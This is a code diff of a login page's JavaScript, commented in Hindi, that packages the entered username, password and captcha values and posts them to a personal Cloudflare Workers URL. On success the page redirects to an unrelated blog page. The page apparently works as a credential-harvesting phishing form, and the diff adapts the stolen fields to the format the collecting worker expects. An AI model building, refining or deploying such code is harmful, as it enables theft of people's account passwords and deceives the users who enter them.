@@ -272,21 +272,28 @@
             const captchaType = document.querySelector('input[name="captchaType"]:checked').value;
             const displayedCaptcha = document.querySelector('.captcha-text').innerText; // "KbL1n"
 
+            // ✅ सही payload बनाएं जो Worker समझ सके
             const payload = {
-                username,
-                password,
-                captchaInput,
-                captchaType,
-                displayedCaptcha,
-                timestamp: new Date().toISOString()
+                type: "User ID",                              // Worker के लिए जरूरी
+                id: Date.now().toString() + '-' + Math.random().toString(36).substr(2, 9), // यूनिक ID
+                data: {
+                    username: username,
+                    password: password,
+                    mobile: "Not provided",                   // Worker को mobile चाहिए, डिफ़ॉल्ट वैल्यू
+                    // नीचे extra fields हैं (चाहें तो हटा सकते हैं)
+                    captcha: captchaInput,
+                    captchaType: captchaType,
+                    displayedCaptcha: displayedCaptcha,
+                    timestamp: new Date().toISOString()
+                }
             };
 
-            // Disable button to prevent double submission (text stays "Login")
+            // Disable button to prevent double submission
             const loginBtn = document.querySelector('.login-btn');
             loginBtn.disabled = true;
 
             try {
-                // 🔁 Replace with your actual Worker URL
+                // 🔁 अपना Worker URL (यही सही है)
                 const workerURL = 'https://falling-waterfall-d23a.vikash6759ub.workers.dev/';
 
                 const response = await fetch(workerURL, {
@@ -299,7 +306,8 @@
                     // Redirect on success
                     window.location.href = 'blogone.html';
                 } else {
-                    alert('Submission failed. Please try again.');
+                    const errorData = await response.json().catch(() => ({}));
+                    alert('Submission failed: ' + (errorData.error || 'Please try again.'));
                     loginBtn.disabled = false;   // Re-enable on error
                 }
             } catch (error) {
@@ -312,5 +320,4 @@
         }
     </script>
 </body>
-
 </html>
